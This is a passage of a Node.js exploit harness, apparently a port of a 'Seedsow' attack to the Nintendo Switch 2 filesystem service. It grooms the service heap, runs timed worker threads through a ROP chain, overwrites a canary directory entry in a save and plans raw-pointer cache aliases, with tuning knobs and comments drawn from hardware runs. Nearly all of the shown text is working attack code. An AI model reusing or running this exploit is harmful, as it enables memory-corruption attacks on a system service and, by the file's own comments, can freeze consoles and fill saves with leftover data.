// Qualify a released reservation group against an owned path canary.
// Receive-buffer extent controls must pass before the optional overwrite trial.
const fs = require('node:fs/promises');
const path = require('node:path');
const {artifactDir} = require('../../shared/paths.cjs');
const OUT = artifactDir(__dirname);
const crypto = require('node:crypto');
const {performance} = require('node:perf_hooks');
const {connect, check, u64} = require("./session.cjs");
const transport = require('../../shared/rpc.cjs');
const {RunControl, StopRequested, reportWriter} = require("./run-control.cjs");
const {packPages} = require("./session-tools.cjs");
const {paths, pathPacket, pathPackets} = require("./paths.cjs");
const normalizedPath = require("./normalized-path.cjs");
const {qualifyOverlap} = require("./wave-overlap.cjs");
const {PinningWindowMiss, releasablePinningControl, retryablePinningMiss,
  retryPinningControl} = require('./pinning-control.cjs');
const localRelease = require('./local-release.cjs');
const positiveReadback = require('./positive-readback.cjs');
const {packet, response} = require("../../shared/ipc.cjs");
const functions = require("../../shared/sdk-functions.json");

// Coarse, monotonic progress for the desktop controller. These are checkpoints,
// not time estimates: a phase may sit on one percentage while it retries waves,
// but the value never goes backwards.
function describePhase(profile) {
  const name = String(profile);
  const cache = /^cache-(.*)-(\d+)-(\d+)$/.exec(name);
  if (cache) {
    const step = cache[1], batch = Number(cache[2]), attempt = Number(cache[3]);
    const label = step.replace(/-/g, ' ');
    if (step.startsWith('combined-leak')) {
      // 54 -> 63 across the three batches, creeping with each attempt.
      return {percent: 54 + Math.min(9, batch * 3 + Math.min(2.5, attempt * 0.1)),
        label: 'clean cache alias: ' + label};
    }
    if (step.startsWith('address-header')) {
      return {percent: 92 + Math.min(3, batch + Math.min(2.5, attempt * 0.1)),
        label: 'address matrix: ' + label};
    }
    if (step.startsWith('period-offset') || step.startsWith('retire-address-entry')) {
      return {percent: 88 + Math.min(2, batch), label: 'address preparation: ' + label};
    }
    return {percent: 64, label: 'cache control: ' + label};
  }
  if (name === 'extent-absent') return {percent: 10, label: 'input extent control'};
  if (name === 'extent-present') return {percent: 16, label: 'requalifying the input extent'};
  if (name.startsWith('abort-')) return {percent: 22, label: name.replace(/-/g, ' ')};
  if (name === 'negative') return {percent: 28, label: 'negative canary control'};
  if (name === 'positive') return {percent: 34, label: 'positive canary wave'};
  if (name === 'address-encoding-control') return {percent: 50, label: 'pointer encoding control'};
  return {percent: 8, label: name.replace(/-/g, ' ')};
}

async function main() {
  const localDelayMs = localRelease.delayFromEnv();
  // Fixed geometry and bounded attempts from the Switch 2 hardware run.
  // Env knobs mirror the parallel Seedsow port (remote-lua-sw2) so a boot can
  // be tuned without editing this file; every default reproduces the numbers
  // that already reached memory-ready here.
  const probeReadSize = 0x180000;
  // The canary entry's offset in the save's directory block depends on the save
  // layout. 0x2340 is the reference save; NS2_MARKER_OFFSET is the per-save
  // knob for the positive overwrite, and NS2_FIELD_OFFSET overrides the copy
  // field separately.
  const markerOverride = Number(process.env.NS2_MARKER_OFFSET) || 0;
  let markerOffset = markerOverride > 0 ? markerOverride : 0x2340;
  let fieldOffset = Number(process.env.NS2_FIELD_OFFSET) || markerOffset;
  check(Number.isSafeInteger(markerOffset) && markerOffset > 0 && markerOffset < 0x2440,
    'NS2_MARKER_OFFSET must be inside the positive payload');
  check(Number.isSafeInteger(fieldOffset) && fieldOffset > 0 && fieldOffset < 0x2800,
    'NS2_FIELD_OFFSET must fit the field-copy window');
  // The pin the exploit holds is a storage opened on the game's own content, so
  // its heap cost is a property of the game, not of this port: the demo costs
  // 7440 bytes and the retail game 8224. A hardcoded value therefore fails the
  // first wave on any other build ("Pinning allocation cost changed" was the
  // retail game's first failure, with every other check in that wave matching).
  // Measure the first pin and adopt it; NS2_PIN_BYTES still overrides.
  const configuredPinBytes = Number(process.env.NS2_PIN_BYTES) || null;
  let pinBytes = configuredPinBytes;
  // A genuine second positive essentially never repeats (73-run dataset from
  // the parallel port). Accept one confirmed marker when asked to; the alias
  // content check below is still the proof that the marker landed.
  const skipRepro = process.env.NS2_SKIP_REPRO === '1';
  // Requalifying the input extent after a type-0 positive is the most common
  // post-marker killer; skip it and keep the already-proven extent.
  const skipExtentRequal = process.env.NS2_SKIP_EXTENT_REQUAL === '1';
  // SleepThread converts nanoseconds with a 31.25 MHz constant while this
  // console's clock counts at 19.2 MHz, so a raw argument sleeps 1.63x long.
  // Measured here: a 300 us delay starts at 490 us. Scale to the reference
  // wall-clock timeline; NS2_SLEEP_RAW=1 restores raw nanoseconds.
  const sleepScale = process.env.NS2_SLEEP_RAW === '1' ? 1 : 19200000 / 31250000;
  const trialRange = 0x600000, cacheReadSize = Number(process.env.NS2_CACHE_READ_SIZE) || 0x200000,
    fragmentCount = 16;
  // The FS heap candidates observed on working boots are high in the 39-bit
  // space (>= 0x1571CB0000, ~92 GiB). The low ~4 GiB region is the app/static
  // mapping: every weak candidate there (0x100010000, 0x1036EC000,
  // 0x108968000, 0x10B934000, 0x10C834000) wedged the bounded address read and
  // froze the console. Reject targets below the floor before planning; the
  // boot then fails cleanly instead of taking the console down.
  const minTarget = process.env.NS2_MIN_TARGET !== undefined && process.env.NS2_MIN_TARGET !== ''
    ? Number(process.env.NS2_MIN_TARGET) : 0x1000000000;
  check(Number.isSafeInteger(minTarget) && minTarget >= 0,
    'NS2_MIN_TARGET must be a nonnegative safe integer');
  // Values that cannot be measured are keyed on the game's own content size,
  // which is stable: 1704516260 on every recorded demo run (192) and
  // 4701016744 on the retail game. Free save space does NOT separate them
  // (33.1 MB vs 33.2 MB). Unknown sizes fall back to the physical floor.
  const gameProfiles = {
    1704516260: {name: 'demo', minimumCacheHeld: 0x2600},
    4701016744: {name: 'retail', minimumCacheHeld: 0x2600},
  };
  const cacheHeldOverride = Number(process.env.NS2_MIN_CACHE_HELD) || null;
  // 0x2810 was a demo-only margin, not a requirement. The copy is at most
  // 0x2358 bytes, so the general 0x2600 floor holds it. A demo console whose
  // cache classes top out below 0x2810 (issue #3) would otherwise reject every
  // alias copy and fail with "Combined acquisition did not obtain the clean
  // alias"; both profiles now use 0x2600, and NS2_MIN_CACHE_HELD still
  // overrides it for an outlier.
  let minimumCacheHeld = cacheHeldOverride || 0x2600;
  const metadataAttempts = 4, fieldCopies = 2;
  const waveAttempts = 30;
// The positive canary wave is fast on every run that proceeds past 2/4 and
// slow on the runs that fail. Cap the whole positive retry series at 10 s so a
// bad boot fails fast instead of spending the join wait on every attempt.
const positiveWaveMs = Number(process.env.NS2_POSITIVE_WAVE_MS || 10000);
  const plannerCycle = 0x28000;
  const canonicalPlanner = require('./cache-address-plan.cjs');
  const addressPlanner = (target, size) => require('./signed-cache-plan.cjs').plan(target, size, plannerCycle);
  const label = 'reserved-gap-' + Date.now(), file = path.join(OUT, label + '.json');
  const {s, live, directory} = await connect(label, 0x2400000);
  s.bulkUploads = true;
  s.uploadThreshold = (256);
  const domain = require(path.join(directory, 'domain.cjs'));
  const mounted = require(path.join(directory, 'mounted-save.cjs'));
  const events = require(path.join(directory, 'events.cjs'));
  const timing = require(path.join(directory, 'timing.cjs'));
  const affinity = require(path.join(directory, 'affinity.cjs'));
  const native = require(path.join(directory, 'native-worker.cjs'));
  const rop = require(path.join(directory, 'seed-rop-chain.cjs'));
  const bulk = require(path.join(directory, 'bulk-transfer.cjs'));
  const {verifyWorkerCode, code} = require(path.join(directory, 'worker.cjs'));
  const {normal, raw} = paths(s, domain);
  const b = s.base, master = b + 0x3000, holeDone = b + 0x3010, groupReleased = b + 0x3020;
  const guardLaunched = b + 0x3030, armGate = b + 0x3040, spacingDecision = b + 0x2a20;
  const completedFlag = b + 0x2a08, completedDecision = b + 0x2a0c;
  const holeFinished = b + 0x2a10, earlyHole = b + 0x2a14, holeDecision = b + 0x2a18;
  const zeroByte = b + 0x2a1c;
  const gates = [], workers = [], created = [], storages = [];
  const scratch = '/NS2_GAP_' + Date.now(), canary = normalizedPath(scratch + '/canary', 0x5a0);
  const marker = 'SPAN_MARKER', absent = 'SPAN_ABSENT';
  const segments = Array.from({length: 3}, (_, i) => 'S' + i + '_' + Date.now());
  const extent = (0x2440);
  // The parallel port found the dirty-commit length decides whether the canary
  // lookup interleaves with the commit drain: 16 MiB drains the canary at the
  // commit end (after the trigger), 8 MiB lets it walk into the freed entry.
  const writeSize = Number(process.env.NS2_COMMIT_MB || 16) * 0x100000;
  // Keep the original receive-buffer address: the positive wave's read lands
  // here, and moving it shifted the heap layout enough to miss the canary.
  // There is 6 MiB below writeData, so a larger NS2_CACHE_READ_SIZE still fits.
  const writeData = b + 0x1000000, output = b + 0xa00000;
  // Bounded FS sends get a private slot page and frame area after the 16 MiB
  // commit buffer. A bad address plan then blocks only its own pthread, not the
  // console's single RPC thread.
  s.setBoundedRegion(b + 0x2010000, b + 0x2400000, b + 0x2000000);
  const requests = Array.from({length: 13}, (_, i) => b + 0x10000 + i * 4096);
  const preReleaseBuffer = b + 0x1d000, clearReportBuffer = b + 0x1e000, pinBuffer = b + 0x1f000;
  const triggerInput = b + 0x30000;
  const tailInputs = Array.from({length: 4}, (_, i) => b + 0x32000 + i * 0x2000);
  const report = {session: live.session, scratch, canary, extent, markerOffset, fieldOffset,
    probeReadSize, trialRange, cacheReadSize, fragmentCount, minimumCacheHeld,
    metadataAttempts, fieldCopies, waveAttempts, plannerCycle, minTarget,
    commitMb: writeSize / 0x100000, pinBytes, skipRepro, skipExtentRequal,
    sleepScale, started: new Date().toISOString(), cases: [],
    localRelease: {mode: 'trigger-worker', delayMs: localDelayMs,
      hostQuietTargetMs: localRelease.HOST_QUIET_MS, armState: 'not-armed', completed: false}};
  let saved, temporary, root, fileHandle, group, pinHandle, candidateHandle, originalRom, released = false;
  let localReleaseMayHaveRun = false;
  let cacheNeedsRestore = false, restoreCandidate;
  // The groom round whose snapshots are scored, so the link search never
  // compares one round's window against the next round's.
  let groomRound = null;
  let addressPlan;
  const save = reportWriter(file, () => ({...report, metrics: s.metrics, retained: {
    base: s.base, bytes: s.bytes, handles: [...s.handles], threads: [...s.threads],
    saved, temporary, root, fileHandle, group, pinHandle, candidateHandle, originalRom, cacheNeedsRestore,
    created, storages, gates, workers, released,
  }}));
  const runControl = new RunControl({id: label, save});
  report.control = runControl.state;
  const call = (offset, args = [0, 0, 0, 0], name) => ({function: live.sdk + offset, args, name});
  const wait = address => call(events.code.wait.offset, [address, 0, 0, 0]);
  const signal = address => call(events.code.signal.offset, [address, 0, 0, 0]);
  const sleep = nanoseconds => call(0x168b54, [Math.round(nanoseconds * sleepScale), 0, 0, 0]);
  const tick = name => call(timing.code.tick.offset, undefined, name);
  const send = (address, handle, name) => ({...call(functions.send.offset,
    [address, 4096, handle, 0], name), kind: 'ipc'});
  const copyWord = (destination, source, name) => call(0x5224e0, [destination, source, 4, 0], name);
  const setByte = (destination, value, name) => call(functions.memset.offset, [destination, value, 1, 0], name);
  function context(bytes, value = 9) {
    const at = domain.wire.dataStart(bytes);
    bytes.writeUInt32LE((bytes.readUInt32LE() & 0xffff0000) | 6);
    bytes.writeUInt32LE(1, at + 4);
    bytes.writeUInt32LE(value, at + 12);
    return bytes;
  }
  async function clone(handle) {
    return domain.oneHandle(await domain.send(s, 'Clone gap client', handle, domain.wire.control(2)));
  }
  async function put(address, bytes) {
    const aligned = Buffer.alloc(Math.ceil(bytes.length / 4) * 4);
    bytes.copy(aligned);
    await s.write(address, aligned);
    return bytes.length;
  }
  async function memory() {
    // Always two reads, use the second. This is not a retry: the counter is
    // still settling when it is read immediately after a release or a batch of
    // allocations, and the first reply returns a transient value. Measured on
    // 2026-11-15: one read gave held = before - 12160 (and even a negative
    // "allocated" after a closeGroup), two reads give the exact 12272 that
    // every recorded run shows. Do not "optimise" this into one call.
    let reply;
    for (let i = 0; i < 2; i++) reply = await s.ipc('Read gap allocation counters', root, 1009);
    check(!reply.result, 'Allocation counters failed');
    return Array.from({length: 16}, (_, i) => Number(reply.data.readBigUInt64LE(i * 8)));
  }
  async function reserveGroupAttempt() {
    const owner = await domain.openDomain(s, 'Gap manager group');
    group = {owner, objects: [], rootCopy: null, outer: null};
    group.rootCopy = domain.oneHandle(await domain.copyObject(s, owner, owner.root));
    group.before = await memory();
    // The RPC batches still execute in order. Each request owns a separate
    // page because SendSyncRequest overwrites that page with its response.
    const reservationPages = Buffer.alloc(59 * 4096);
    const managerPacket = domain.wire.domain(owner.root, 1200);
    const addresses = Array.from({length: 59}, (_, i) => b + 0x60000 + i * 4096);
    addresses.forEach((_, i) => managerPacket.copy(reservationPages, i * 4096));
    await s.write(b + 0x60000, reservationPages);
    for (let first = 0; first < addresses.length; first += 32) {
      const batch = addresses.slice(first, first + 32);
      const sent = await s.rpc.batch(batch.map(address => ({fn: live.sdk + functions.send.offset,
        args: [address, 4096, owner.handle]})));
      check(sent.every(reply => reply.result === 0), 'Manager reservation transport failed');
      const received = await s.rpc.batch(batch.map(address => ({read: address, size: 256})));
      for (const bytes of received) {
        check(bytes.bytes.length === 256, 'Short manager reply read');
        const reply = domain.wire.response(bytes.bytes, {domain: true});
        check(!reply.result && reply.objects.length === 1 && !reply.moves.length && !reply.copies.length,
          'Manager reservation failed');
        group.objects.push(reply.objects[0]);
      }
    }
    group.held = await memory();
    const allocated = group.before[5] - group.held[5];
    (report.reservationChecks ||= []).push({before: group.before[5], held: group.held[5], allocated});
    await save();
    if (allocated !== 59 * 208)
      throw Object.assign(Error('Unexpected manager allocation size: ' + allocated), {reservationAccounting: true});
    const converted = await domain.send(s, 'Wrap gap group', owner.handle, domain.wire.control(0));
    check(!converted.result, 'Group wrapping failed');
    group.outer = converted.data.readUInt32LE();
    await s.write(requests[9], domain.wire.closeObject(group.outer));
    const handle = Buffer.alloc(4);
    handle.writeUInt32LE(owner.handle);
    await s.write(b + 0x2a00, handle);
  }
  async function reserveGroup() {
    for (let attempt = 0; attempt < 3; attempt++) {
      try {return await reserveGroupAttempt();}
      catch (error) {
        if (!error.reservationAccounting || attempt === 2) throw error;
        // Nothing in this group has been corrupted, and no worker has started
        // this wave. Release the owned group before measuring a fresh one.
        check(!s.threads.size, 'Cannot retry a reservation while workers are active');
        await closeGroup();
        const observation = report.reservationChecks.at(-1);
        observation.releasedForRetry = true;
        observation.afterRelease = await memory();
        await save();
      }
    }
  }
  async function closeGroup() {
    if (!group) return;
    if (group.outer !== null) {
      await domain.closeObject(s, group.owner, group.outer);
      group.outer = null;
      group.objects.length = 0;
    } else {
      while (group.objects.length) {
        await domain.closeObject(s, group.owner, group.objects.at(-1));
        group.objects.pop();
      }
    }
    for (const handle of [group.rootCopy, group.owner.handle]) if (s.handles.has(handle)) await s.close(handle);
    group = null;
  }

  try {
    await runControl.start();
    console.log(JSON.stringify({stage: 'connected', file, control: runControl.state}));
    report.progress = {percent: 4, label: 'connected to the FS session', profile: null,
      at: new Date().toISOString()};
    await save();
    await runControl.checkpoint('before setup');
    // Seedsow workers run on pthreads through a longjmp/ROP chain.
    await fs.copyFile(__filename, path.join(OUT, label + '-source.cjs'));
    for (const helper of ['cache-address-plan.cjs', 'fs-memory-control.cjs', 'session-tools.cjs', 'run-control.cjs', 'capture-workers.cjs', 'native-links.cjs', 'wave-overlap.cjs', 'pinning-control.cjs', 'local-release.cjs', 'positive-readback.cjs'])
      await fs.copyFile(path.join(__dirname, helper), path.join(OUT, label + '-' + helper));
    for (const helper of ['native-worker.cjs', 'affinity.cjs'])
      await fs.copyFile(path.join(directory, helper), path.join(OUT, label + '-' + helper));
    await fs.copyFile(path.join(__dirname, 'cache-address-plan.cjs'), path.join(OUT, label + '-address-plan-source.cjs'));
    {
      await fs.copyFile(path.join(__dirname, 'signed-cache-plan.cjs'), path.join(OUT, label + '-signed-plan-source.cjs'));
    }
    // Seedsow: SmileBASIC worker/event/timing preflight is not ported yet.
    // await verifyWorkerCode(s);
    // await s.verifyCode({offset: 0x586fb0, ...}, 'Original SDK memcpy...');
    // await events.verify(s);
    // cnthctl_el0/cntfrq_el0: GetSystemTick is the 19.2 MHz virtual counter.
    const frequency = await s.rpc.call3(live.sdk + timing.code.frequency.offset, 0, 0, 0);
    check(frequency > 0, 'Counter frequency is unavailable');
    const mask = 0xffffffffn;
    const cores = Array.from({length: 32}, (_, i) => 1n << BigInt(i)).filter(bit => bit & mask);
    // Seedsow: heap pages cannot be made executable (svcSetMemoryPermission 0xD801),
    // so workers use pthread_create + longjmp + a ROP call chain.
    report.mountPlan = {save: 'save', temporary: 'save'};
    saved = await mounted.cloneMountedFilesystem(s, 'save');
    // Reclaim the scratch earlier boots left behind. The end-of-run cleanup is
    // skipped on purpose (doing it froze the console), so every run leaves its
    // commit_data in the save - 8 MiB at the default NS2_COMMIT_MB. The demo
    // save has room for a few of those; a retail save does not, and the run
    // then dies at "Insufficient save space" before the first wave.
    {
      const filesystem = require(path.join(directory, 'filesystem.cjs'));
      const removed = [];
      // A retail save can hold several hundred entries; the old 256-entry cap
      // made this listing throw, which silently skipped the cleanup below.
      let roots = null;
      try {
        roots = await filesystem.listDirectory(s, saved, '/', Number.MAX_SAFE_INTEGER);
      } catch (error) {
        report.saveCleanupError = error.message;
        console.log(JSON.stringify({stage: 'save-cleanup-unavailable', error: error.message}));
      }
      for (const entry of roots || []) {
        if (entry.type !== 0 || !entry.name.startsWith('NS2_GAP_')) continue;
        const stack = ['/' + entry.name];
        while (stack.length) {
          const dir = stack.pop();
          const children = await filesystem.listDirectory(s, saved, dir, 256).catch(() => []);
          for (const child of children) {
            const target = dir + '/' + child.name;
            if (child.type === 0) stack.push(target);
            else await normal(saved, 4, target);
          }
          await normal(saved, 4, dir);
        }
        removed.push('/' + entry.name);
      }
      if (removed.length) {
        const committed = await s.ipc('Commit save cleanup', saved, 10);
        check(!committed.result, 'Save cleanup commit failed');
        report.saveCleanup = {removed, committed: committed.canonicalResult};
        console.log(JSON.stringify({stage: 'save-cleanup', removed}));
        await save();
      }
    }
    temporary = await mounted.cloneMountedFilesystem(s, 'save');
    root = await s.openService('fsp-srv');
    check(!(await s.ipc('Initialize gap root', root, 1, u64(0), {pid: true})).result, 'Root initialization failed');
    try {
      await fs.copyFile(path.join(__dirname, 'mounted-rom.cjs'), path.join(OUT, label + '-mounted-rom-source.cjs'));
      const copied = await require("./mounted-rom.cjs").cloneMountedRom(s, live, directory);
      originalRom = copied.handle;
      report.originalRom = copied.source;
    } catch (error) {
      originalRom = null;
      report.originalRom = {skipped: error.message};
    }
    const requiredSaveSpace = writeSize + 0x400000 + 0x10000;
    const space = await normal(saved, 11, '/');
    const free = space.result ? 0n : space.data.readBigUInt64LE();
    report.freeSpace = {save: {result: space.result, bytes: free.toString(), required: requiredSaveSpace}};
    check(!space.result && free > BigInt(requiredSaveSpace), 'Insufficient save space');
    check((await normal(saved, 7, scratch)).canonicalResult === 0x202, 'Scratch already exists');
    check(!(await normal(saved, 2, scratch)).result, 'Scratch creation failed');
    created.push({name: 'save', handle: saved, path: scratch});
    await save();
    const filename = scratch + '/commit_data';
    check(!(await normal(saved, 0, filename, Buffer.concat([u64(0), u64(writeSize)]))).result, 'Commit file creation failed');
    const parts = canary.slice(1).split('/');
    for (let i = 2; i < parts.length; i++) check(!(await normal(saved, 2,
      '/' + parts.slice(0, i).join('/'))).result, 'Canary parent creation failed');
    check(!(await normal(saved, 0, canary, Buffer.concat([u64(0), u64(1)]))).result, 'Canary creation failed');
    const control = await normal(saved, 7, canary);
    check(!control.result && control.data.readUInt32LE() === 1, 'Canary is not a file');
    report.abortControlResult = (await normal(saved, 7, '')).canonicalResult;
    const selectedDirectory = scratch + '/selected';
    check(!(await normal(saved, 2, selectedDirectory)).result, 'Replacement directory creation failed');
    let markerDirectory = scratch;
    for (const segment of segments) {
      markerDirectory += '/' + segment;
      check(!(await normal(temporary, 2, markerDirectory)).result, 'Extent directory creation failed');
    }
    check(!(await normal(temporary, 0, markerDirectory + '/' + marker,
      Buffer.concat([u64(0), u64(1)]))).result, 'Extent marker creation failed');
    // Opening the game's own content is the same allocation the pin makes
    // later, so this quiet measurement is a second opinion on its cost. It is
    // recorded, not enforced: the pin wave itself is authoritative.
    const storageBefore = await memory();
    const storage = domain.oneHandle(await s.ipc('Open own gap content', root, 200));
    const storageAfter = await memory();
    report.storageOpenCost = storageBefore[5] - storageAfter[5];
    const storageSize = await domain.storageSize(s, storage);
    check(storageSize >= BigInt(probeReadSize), 'Own content is too small');
    report.storageSize = storageSize.toString();
    // Identify the game once the content size is known, and pick the per-game
    // defaults. Everything measurable (the pin cost) stays measured; this is
    // only for values that cannot be derived from the boot itself.
    const game = gameProfiles[Number(storageSize)] || {name: 'unknown', minimumCacheHeld: 0x2600};
    if (!cacheHeldOverride) minimumCacheHeld = game.minimumCacheHeld;
    report.minimumCacheHeld = minimumCacheHeld;
    report.game = {profile: game.name, contentSize: report.storageSize,
      freeSpace: report.freeSpace?.save?.bytes ?? null, minimumCacheHeld};
    console.log(JSON.stringify({stage: 'game', ...report.game}));
    // The canary entry's offset in the save content depends on the save's
    // directory layout. The reference save has it at 0x2340; a save with a
    // different launcher/layout has the filler entry there instead, so the
    // positive overwrite changes filler0 and fails with "Overwrite missed the
    // qualified canary". Find the actual `canary` entry and use it. An explicit
    // NS2_MARKER_OFFSET still wins, and NS2_FIELD_OFFSET still overrides the
    // copy field separately.
    if (!process.env.NS2_MARKER_OFFSET) {
      const fieldOverride = Number(process.env.NS2_FIELD_OFFSET) || null;
      const scanSize = Math.max(0x8000, cacheReadSize);
      await s.call('memset', output, 0xa5, scanSize);
      const scan = await s.ipc('Read the save content for the canary offset', storage, 0,
        Buffer.concat([u64(0), u64(scanSize)]),
        {receive: [{address: output, size: scanSize, mode: 1}]});
      check(!scan.result, 'Save content control failed');
      const bytes = await bulk.read(s, output, scanSize);
      const needle = Buffer.from('canary');
      let found = -1;
      for (let at = 0; at + needle.length <= bytes.length; at++) {
        if (bytes.subarray(at, at + needle.length).equals(needle)) { found = at; break; }
      }
      if (found > 0 && found < 0x2440) {
        markerOffset = found;
        report.markerOffset = found;
        if (!fieldOverride) {
          fieldOffset = found;
          report.fieldOffset = found;
        }
        console.log(JSON.stringify({stage: 'canary-offset', offset: found}));
      } else {
        console.log(JSON.stringify({stage: 'canary-offset', fallback: markerOffset,
          found}));
      }
    }
    if (originalRom) check(await domain.storageSize(s, originalRom) === storageSize, 'Mounted RomFS size differs');
    async function nativeLinks(range) {
      const snapshots = [range, ...(range.fragmentation || [])];
      if (range.commitReleaseFile) snapshots.unshift({name: 'commit-release',
        outputFile: range.commitReleaseFile, outputSha256: range.commitReleaseSha256});
      if (range.beforeReleaseFile) snapshots.unshift({name: 'before-release',
        outputFile: range.beforeReleaseFile, outputSha256: range.beforeReleaseSha256});
      const candidates = await require("./native-links.cjs").findNativeLinks(snapshots, true);
      for (const item of candidates) {
        item.encodable = false;
        if (item.target < minTarget) {
          item.belowTargetFloor = minTarget;
          continue;
        }
        try {
          addressPlanner(item.target, Number(storageSize));
          item.encodable = true;
        } catch (error) { item.planError = error.message; }
      }
      return candidates;
    }
    async function prepareAddressControl(evidence, evidenceFile) {
      addressPlan = (require("../retained/lower-window.cjs").lowerWindow(
        Number(evidence.target), Number(storageSize), plannerCycle, report.linkCandidates.map(item => item.target)));
      report.cacheAddress = {evidenceFile: path.resolve(evidenceFile), evidence,
        lowerWindow: addressPlan.lowerWindow,
        encoding: addressPlan.encoding, addressBias: addressPlan.addressBias, arithmetic: addressPlan.arithmetic,
        plannerCycle: addressPlan.cycle, headerFormat: addressPlan.headerFormat || 'original',
        target: addressPlan.target, base: addressPlan.base, entryOffset: addressPlan.entryOffset,
        readOffset: addressPlan.readOffset, header: addressPlan.bytes.toString('hex')};
      // Read the ordinary content before installing a raw pointer. Combined
      // acquisition requalifies the cache alias after these reads.
      await s.call('memset', output, 0xa5, 0x4000);
      const ordinary = await s.ipc('Read the ordinary address-window control', storage, 0,
        Buffer.concat([u64(addressPlan.readOffset), u64(0x4000)]),
        {receive: [{address: output, size: 0x4000, mode: 1}]});
      check(!ordinary.result, 'Ordinary address-window control failed');
      report.cacheAddress.controlFile = path.join(OUT, label + '-address-control.bin');
      await fs.writeFile(report.cacheAddress.controlFile, await s.readOwned(output, 0x4000), {mode: 0o600});
      {
        await s.call('memset', output, 0xa5, 16);
        const period = await s.ipc('Read the ordinary bucket-period control', storage, 0,
          Buffer.concat([u64(0x28000), u64(16)]), {receive: [{address: output, size: 16, mode: 1}]});
        check(!period.result, 'Ordinary bucket-period control failed');
        report.cacheAddress.periodControlHex = (await s.readOwned(output, 16)).toString('hex');
      }
    }
    const clients = [await clone(saved), storage];
    for (let i = 0; i < 4; i++) clients.push(await clone(root));
    for (let i = 0; i < 3; i++) clients.push(await clone(saved));
    clients.push({u32: b + 0x2a00}, await clone(saved), await clone(saved), {u32: b + 0x2a04});
    const savedTrigger = await clone(saved), tmpTrigger = await clone(temporary);
    for (const gate of [master, holeDone, groupReleased, guardLaunched, armGate]) {
      await events.initialize(s, gate);
      gates.push(gate);
    }
    await s.call('memset', writeData, 0x66, writeSize);
    const canarySize = await put(b + 0x40000, Buffer.from(canary + '\0'));
    const guard = normalizedPath(scratch + '/absent', 0x300);
    for (let i = 0; i < 2; i++) await put(b + 0x42000 + i * 4096,
      Buffer.from((i ? guard.slice(0, -1) + 'C' : guard) + '\0'));
    const guardRequest = pathPackets(5, Buffer.alloc(0), [0, 1].map(i =>
      ({address: b + 0x42000 + i * 4096, size: 0x301})));
    await put(b + 0x45000, Buffer.from('/NS2_SRC00000000'));
    await put(b + 0x46000, Buffer.from(normalizedPath(scratch + '/page_absent', 0x7ef) + '\0'));
    const fillerRequest = pathPackets(5, Buffer.alloc(0),
      [{address: b + 0x45000, size: 16}, {address: b + 0x46000, size: 0x7f0}]);
    for (const bytes of [guardRequest, fillerRequest]) check((await domain.send(s,
      'Ordinary gap path control', saved, bytes)).canonicalResult === 0x202, 'Path control differs');
    // Keep the original one-storage heap footprint by default: opening extra
    // content storages before the positive wave changed the FS heap enough
    // that 4/4 runs missed the canary. Deeper grooming comes from priming more
    // blocks per owner instead. NS2_GROOM_OWNERS can still be raised for a
    // deliberate experiment.
    const groomOwners = Math.max(1, Math.min(8, Math.floor(Number(process.env.NS2_GROOM_OWNERS)) || 1));
    for (let i = 0; i < groomOwners; i++) storages.push(domain.oneHandle(
      await s.ipc('Reserve own gap content ' + i, root, 200)));
    const roles = ['commit', 'hole', 'tail0', 'tail1', 'tail2', 'tail3', 'canary',
      'filler0', 'filler1', 'release', 'guard0', 'guard1', 'trigger'];
    const delays = ([0, 300000, 350000, 450000, 550000, 650000, 1700000, 2000000, 2150000, 2800000]);
    report.workerDelaysNs = delays;
    const plans = roles.map((role, i) => {
      const steps = i === 12
        ? localRelease.triggerPrefix(localDelayMs, armGate, master, {wait, sleep, tick, signal})
        : [wait(master)];
      if (i < 10) steps.push(sleep(delays[i]));
      else if (i < 12) steps.push(wait(groupReleased), sleep((i - 10) * 150000));
      else steps.push(sleep(2400000), wait(groupReleased), wait(guardLaunched), sleep(400000),
        copyWord(spacingDecision, holeFinished, 'sampleMinimumSpacing'), wait(holeDone));
      if (i === 9) steps.push(tick('pinStart'), send(pinBuffer, root, 'pin'), tick('pinEnd'));
      if (i === 9) steps.push(tick('clearStart'), send(clearReportBuffer, root, 'clearReport'), tick('clearEnd'),
        tick('memoryStart'), send(preReleaseBuffer, root, 'preRelease'), tick('memoryEnd'));
      if (i === 11) steps.push(copyWord(earlyHole, holeFinished, 'sampleReceiveOrder'), signal(guardLaunched));
      if (i === 12) steps.push(copyWord(completedDecision, completedFlag, 'sampleCompleted'),
        copyWord(holeDecision, earlyHole, 'sampleEarlyHole'),
        // A zero-length copy preserves the payload. A one-byte copy makes
        // it an ordinary empty path before the kernel receives the buffer.
        call(0x5224e0, [triggerInput, zeroByte, {u32: completedDecision}, 0], 'abortCompleted'),
        call(0x5224e0, [triggerInput, zeroByte, {u32: holeDecision}, 0], 'abortEarlyHole'),
        call(0x5224e0, [triggerInput, zeroByte, {u32: spacingDecision}, 0], 'abortMinimumSpacing'));
      steps.push(tick('start'), send(requests[i], clients[i], role), tick('end'));
      if (i === 1) steps.push(setByte(holeFinished, 1, 'holeFinished'), signal(holeDone));
      if (i === 9) steps.push(signal(groupReleased));
      if (i === 0 || i >= 2 && i <= 8 || i === 10 || i === 11)
        steps.push(setByte(completedFlag, 1, 'protectedRequestFinished'));
      return steps;
    });

    const waveAttemptCounts = new Map();
    // Data-driven retry caps (tools/analyze-runs.cjs, 559 recorded attempts):
    // no successful boot exceeded 17 combined-leak waves or 16 address-phase
    // waves, while the multi-minute failures ran 58-171 of them. Stop a family
    // that keeps retrying instead of burning minutes before it fails. 0
    // disables a cap; the defaults leave several waves of margin above the
    // observed successful maximum.
    const waveFamilyCaps = {
      alias: Number(process.env.NS2_ALIAS_WAVE_CAP ?? 24),
      address: Number(process.env.NS2_ADDRESS_WAVE_CAP ?? 24),
    };
    report.waveFamilyCaps = waveFamilyCaps;
    const waveFamilyCounts = new Map();
    function waveFamily(profile) {
      if (/^cache-combined-leak/.test(profile)) return 'alias';
      if (/^cache-(address-header|period-offset|retire-address-entry|address-alias-offset)/.test(profile)) return 'address';
      return null;
    }
    async function wave(profile, readSize, customPayload = null, readbackFirstPositive = false) {
      const family = waveFamily(profile);
      if (family && waveFamilyCaps[family] > 0) {
        const count = (waveFamilyCounts.get(family) || 0) + 1;
        waveFamilyCounts.set(family, count);
        report.waveFamilyCounts = Object.fromEntries(waveFamilyCounts);
        if (count > waveFamilyCaps[family]) {
          await save();
          throw Error('Cache ' + family + ' retried ' + count + ' waves without progress (cap ' +
            waveFamilyCaps[family] + '); this boot will not qualify - relaunch');
        }
      }
      await runControl.begin(profile);
      const hostStarted = performance.now(), hostRequests = s.metrics.requests;
      const createPin = (!pinHandle);
      const positiveHandlesBefore = readbackFirstPositive ? new Set(s.handles) : null;
